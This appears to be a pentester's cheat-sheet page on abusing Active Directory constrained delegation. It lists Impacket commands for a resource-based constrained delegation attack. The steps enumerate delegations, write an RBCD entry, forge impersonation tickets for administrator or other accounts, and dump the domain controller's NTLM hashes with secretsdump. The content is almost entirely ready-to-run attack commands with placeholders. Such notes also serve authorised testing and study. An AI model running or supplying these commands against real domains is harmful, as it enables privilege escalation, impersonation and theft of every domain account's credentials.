---
title: "Constrained Delegation"
date: 2024-8-2
tags: ["constrained delegation", "active driectory", "ad", "Windows", "impacket", "rbcd"]
---

### Abuse #1: RBCD Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Find delegation

<div>

```console
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
```

```console
impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self
```

```console
# Check forwardable flag
describeTicket.py <TICKET_1>.ccache
```

</div>

#### 2. RBCD

<div>

```console
# Add delegation
impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps
```

```console
# Check
sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k
```

```console
# Impersonate
impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2>
```

```console
# Check forwardable flag
describeTicket.py <TICKET_2>.ccache
```

</div>

#### 3. Impersonate

<div>

```console
impacket-getST -spn <SERVICE>/<DC> -impersonate <TARGET_2> '<DOMAIN>/<TARGET_1>' -hashes :<HASH> -additional-ticket <TICKET_2>.ccache
```

</div>

#### 4. Secrets Dump

<div>

```console
# Import ticket
export KRB5CCNAME='<TICKET_2>.ccache'
```

```console
impacket-secretsdump -no-pass -k <DC> -just-dc-ntlm
```

</div>

{{< /tabcontent >}}

<br>